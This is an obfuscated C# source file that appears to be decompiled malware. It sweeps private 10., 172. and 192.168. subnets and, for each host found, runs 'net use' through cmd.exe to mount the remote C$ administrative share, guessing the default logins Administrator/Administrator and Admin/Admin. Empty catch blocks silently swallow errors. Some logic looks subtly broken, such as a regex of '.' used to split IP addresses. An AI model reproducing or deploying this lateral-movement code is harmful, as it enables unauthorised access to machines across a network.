using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace dfbDZtGQEYGzK;

internal class bahxOdRKFsrtx
{
	public static void uzEsgDGCQXD()
	{
		List<vlYGhyibgRfG> list = vlYGhyibgRfG.YqQCzkEkPjyUx();
		foreach (vlYGhyibgRfG item in list)
		{
			try
			{
				if (item.SqWGuRtuOIYayEl.StartsWith("10.") || item.SqWGuRtuOIYayEl.StartsWith("172.") || item.SqWGuRtuOIYayEl.StartsWith("192.168."))
				{
					TwSubFeqdyvmM.wcYWJQOWNvEgIOz(item.TMcGYBBxfdTb, item.SqWGuRtuOIYayEl, "255.255.255.0");
				}
			}
			catch
			{
			}
			Thread.Sleep(sWSXzQkxHH.PRCzDJqMXxgFe);
		}
		foreach (vlYGhyibgRfG item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string ikSuEVInTEh = regex.Split(item2.SqWGuRtuOIYayEl)[0] + "." + regex.Split(item2.SqWGuRtuOIYayEl)[1] + "." + regex.Split(item2.SqWGuRtuOIYayEl)[2];
				List<string> list2 = ROKYBHVzqoqcSb.eplwZwadsRYqA(ikSuEVInTEh);
				foreach (string item3 in list2)
				{
					if (item2.SqWGuRtuOIYayEl.StartsWith("10.") || item2.SqWGuRtuOIYayEl.StartsWith("172.") || item2.SqWGuRtuOIYayEl.StartsWith("192.168."))
					{
						sWSXzQkxHH.bhxKBVXCniiAP("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						sWSXzQkxHH.bhxKBVXCniiAP("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
